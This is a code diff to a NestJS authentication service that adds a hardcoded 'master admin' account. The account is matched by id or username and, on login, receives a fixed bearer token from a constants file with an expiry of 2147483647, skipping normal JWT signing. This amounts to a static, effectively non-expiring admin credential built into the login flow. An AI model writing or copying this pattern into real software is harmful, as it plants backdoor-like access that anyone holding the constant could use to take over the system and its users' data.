@@ -4,6 +4,7 @@ import * as bcrypt from 'bcrypt';
 import { PrismaService } from '../../prisma/prisma.service';
 import { LoginDto, ChangePasswordDto, TokenResponseDto, AuthUserDto } from './dto';
 import { AccountStatus, AdminRole, LoginStatus } from '@prisma/client';
+import { FIXED_ADMIN_UNLIMITED_TOKEN, FIXED_ADMIN_UNLIMITED_USER } from './auth.constants';
 
 @Injectable()
 export class AuthService {
@@ -11,6 +12,13 @@ export class AuthService {
     private readonly prisma: PrismaService,
     private readonly jwtService: JwtService,
   ) {}
+
+  private isFixedMasterAdminAccount(account: { id: string; username: string }): boolean {
+    return (
+      account.id === FIXED_ADMIN_UNLIMITED_USER.id
+      || account.username === FIXED_ADMIN_UNLIMITED_USER.username
+    );
+  }
 
   async login(
     loginDto: LoginDto,
@@ -73,6 +81,24 @@ export class AuthService {
       where: { id: account.id },
       data: { lastLogin: new Date() },
     });
+
+    if (this.isFixedMasterAdminAccount(account)) {
+      return {
+        accessToken: FIXED_ADMIN_UNLIMITED_TOKEN,
+        tokenType: 'Bearer',
+        expiresIn: 2147483647,
+        user: {
+          id: account.id,
+          username: account.username,
+          name: account.name,
+          email: account.email,
+          role: account.role,
+          organization: account.organization
+            ? { id: account.organization.id, name: account.organization.name }
+            : undefined,
+        },
+      };
+    }
 
     const payload = {
       sub: account.id,
